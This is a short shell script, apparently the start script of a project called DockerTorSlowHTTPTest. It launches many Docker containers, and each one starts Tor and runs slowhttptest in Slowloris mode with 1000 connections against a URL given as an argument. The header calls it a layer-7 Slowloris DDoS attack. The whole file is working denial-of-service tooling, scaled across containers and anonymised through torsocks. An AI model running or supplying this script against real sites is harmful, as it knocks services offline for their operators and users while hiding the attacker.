#!/bin/sh

# DockerTorSlowHTTPTest - start.sh : start a 7 layer Slowloris DDOS attack using Docker and Tor
#
# $1 : The URL to the host (ie http://example.com)
# $2 : Total number of docker instance
# Author : lehoangminh@live.com

echo "" > runningDockerID

for i in `seq 1 $2`;
do
	docker run -d g2minhle/dockertorslowhttptest /bin/bash -c "service tor start ; torsocks /slowhttptest/src/slowhttptest -H -u $1 -r 1000 -c 1000" >> runningDockerID
done


